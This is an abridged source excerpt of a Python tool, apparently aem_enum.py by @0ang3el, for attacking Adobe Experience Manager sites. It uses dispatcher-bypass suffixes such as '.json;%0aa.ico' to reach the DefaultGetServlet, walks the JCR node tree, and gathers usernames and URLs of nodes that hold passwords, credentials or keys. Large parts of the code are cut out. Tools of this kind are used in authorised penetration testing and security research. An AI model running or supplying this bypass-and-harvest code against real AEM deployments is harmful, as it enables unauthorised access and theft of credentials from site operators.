...
Uses the DefaultGetServlet to traverse the JCR node tree and extract:
  - Usernames found in 'jcr:createdBy'-style attributes
  - URLs to nodes whose names match known secret/credential patterns

Results are written to a CSV file (delimiter: |).

Usage:
    python3 aem_enum.py --url https://aem.example.com [options]
"""
...
def http_request(url, method="GET", data=None, additional_headers=None, proxy=None):
    ...
    intermediate 302 responses can be detected.
    """
    headers = {
...
def dispatcher_bypass_get_servlet(base_url, proxy, debug):
    """Auto-detect a working base node and suffix that exposes the DefaultGetServlet.

    Iterates over a set of base paths and dispatcher-bypass suffixes and returns
    the first (base, suffix) pair that returns a valid JCR JSON response.
    Returns None if the servlet is not accessible.
    """
    ...
    SUFFIX = (
        ...
        ".json;%0aa.ico",
        ".json;%0aa.1.json",
    )  # Are used to bypass AEM dispatcher
            ...
            if resp.status_code == 200:
                try:
                    json.loads(resp.content.decode())[
                        "jcr:primaryType"
                    ]  # Check if AEM's default GET servlet is accessible
                except Exception:
                    pass
                else:
                    return base, suffix
...
def process_node_get_servlet(
    tpe, base_url, base, suffix, current_depth, max_depth, grab_depth, proxy, debug
):
    """Recursively enumerate JCR nodes under *base* and collect usernames and secret URLs.

    Searches each JSON subtree for:
      - Keys ending in 'By' (username hints, e.g. jcr:createdBy)
      - Keys matching known secret patterns (passwords, credentials, keys, etc.)

    Schedules deeper traversal via the thread-pool executor *tpe*.
    Returns a (users, secrets) tuple even when the request fails so that
    the handle_finding callback always receives an unpackable result.
    """
    ...
    try:
        ...
        for s_glob in SECRETS_GLOBS:
            ...
            for secret, _ in results:
                ...
                secrets.add(
                    "{0}{1}{2}".format(path, secret, suffix)
                )  # Save URL to access secret
        ...
        for p in paths_to_observe:
            ...
            future = tpe.submit(
                process_node_get_servlet, *params
            )  # Launch new tasks to explore subtrees
...
def handle_finding(future):
    """Callback invoked when a process_node_get_servlet future completes.

    Merges the partial (users, secrets) result into the global sets and
    keeps the main loop alive by setting *running = True*.
    """
...
def parse_args():
    ...
    parser = argparse.ArgumentParser(
        description="AEM exploration tool by @0ang3el (grabs users and secrets), see the slides - https://speakerdeck.com/0ang3el/hunting-for-security-bugs-in-aem-webapps"
    )

    parser.add_argument("--url", help="AEM webapp URL, required parameter")
    parser.add_argument(
        "--base",
        help="set base node (/etc or /apps or /home or /var), if not set, base node is selected automatically",
    )
    parser.add_argument(
        "--grabdepth",
        type=int,
        default=2,
        help="JCR subtree depth on each iteration, 2 should be a safe value for all nodes",
    )
    parser.add_argument(
        "--maxdepth",
        type=int,
        default=4,
        help="maximum depth for JCR search, increase it to find more",
    )
    parser.add_argument(
    ...
    parser.add_argument(
        "--out",
        default="output.csv",
        help="CSV file with results, delimiter symbol is |",
    )
...
def main():
    """Entry point: enumerate AEM users and secrets and write results to a CSV file."""
